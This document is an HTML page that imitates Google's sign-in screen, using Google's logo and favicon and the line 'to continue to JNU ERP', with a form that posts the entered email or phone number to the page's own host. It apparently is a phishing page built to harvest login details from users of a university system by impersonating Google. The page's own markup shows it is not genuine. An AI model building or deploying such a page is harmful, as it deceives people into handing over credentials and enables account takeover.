<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in â€“ Google</title>
  <link rel="icon" href="https://www.google.com/favicon.ico">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body { 
    font-family: 'Roboto', sans-serif;
    background: #f2f2f2; 
    display: flex; 
    align-items: center; 
    justify-content: center; 
    min-height: 100vh; 
    margin: 0;
    padding: 20px;
  }
  /* Mobile-friendly defaults */
  .google-container {
    background: #fff; 
    padding: 22px 18px; 
    border-radius: 8px; 
    box-shadow: 0 2px 6px rgba(0,0,0,0.12); 
    width: 100%;
    max-width: 360px;
  }
  .google-logo {
    display: block;
    margin: 0 auto 16px;
    width: 72px;
  }
  h1 { 
    font-size: 1.25rem; 
    text-align: center; 
    margin-bottom: 12px; 
    color: #202124; 
  }
  input {
    width: 100%;
    padding: 14px;
    border: 1px solid #dadce0;
    border-radius: 6px;
    margin-top: 12px;
    font-size: 1rem;
    box-sizing: border-box;
  }
  .btn {
    width: 100%;
    background: #1a73e8;
    color: white;
    border: none;
    padding: 14px;
    margin-top: 18px;
    border-radius: 6px;
    font-size: 1rem;
    cursor: pointer;
  }
  .btn:hover {
    background: #1765cc;
  }

  /* Preserve original desktop look at >= 768px */
  @media (min-width: 768px) {
    .google-container {
      padding: 40px 30px;
      max-width: 380px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    }
    .google-logo { width: 80px; margin-bottom: 20px; }
    h1 { font-size: 1.5rem; margin-bottom: 20px; }
    .btn { margin-top: 25px; padding: 14px; border-radius: 4px; }
  }
</style>

  <style>
    body { font-family: 'Roboto', sans-serif; background:#f2f2f2; }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen">
  <div class="bg-white rounded-lg shadow-md w-full max-w-md p-8 animate-fadeIn google-container">
    <div class="flex justify-center mb-6">
      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png" alt="Google" class="google-logo">
    </div>
    <h1 class="text-2xl font-normal text-gray-800 mb-2 text-center">Sign in</h1>
    <p class="text-sm text-gray-600 mb-6 text-center">to continue to JNU ERP</p>

    <form method="POST" class="space-y-6">
      <div>
        <input name="email" type="email" placeholder="Email or phone"
               class="w-full border border-gray-300 rounded-md px-3 py-3 text-gray-800 focus:outline-none focus:border-blue-500" autocomplete="email" inputmode="email">
      </div>
      <button type="submit" class="btn">
        Next
      </button>
    </form>
    <p class="text-xs text-gray-500 mt-8 text-center"></p>
  </div>
</body>
</html>
